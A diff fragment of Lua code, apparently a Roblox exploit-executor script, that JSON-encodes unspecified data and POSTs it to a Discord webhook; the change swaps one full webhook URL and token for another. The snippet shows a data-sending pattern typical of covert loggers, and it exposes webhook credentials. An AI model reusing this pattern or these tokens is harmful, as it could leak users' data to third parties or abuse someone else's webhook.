@@ -102,7 +102,7 @@ local Success, Error = pcall(function()
         local Encoded                  = HttpService:JSONEncode(Data)
 
         Request                        = http_request or request or HttpPost or syn.request
-        local Final = {Url             = "https://discord.com/api/webhooks/965561459595690055/OuxOrItkIYrtiYRX6fBMvTXVx105TimI1sWObYUdu61nPO3T0Fnt9Yc5rB1d00r_IYS9", Body = Encoded, Method = "POST", Headers = Headers}
+        local Final = {Url             = "https://discord.com/api/webhooks/967579103660224563/SuF8-otKIGDNOd8Y6rODlsaSZS8FE6xXZQx0tM1Yq259y5x1oPhbWJXAVfi-y0IJLQ1S", Body = Encoded, Method = "POST", Headers = Headers}
 
         Request(Final)
     end
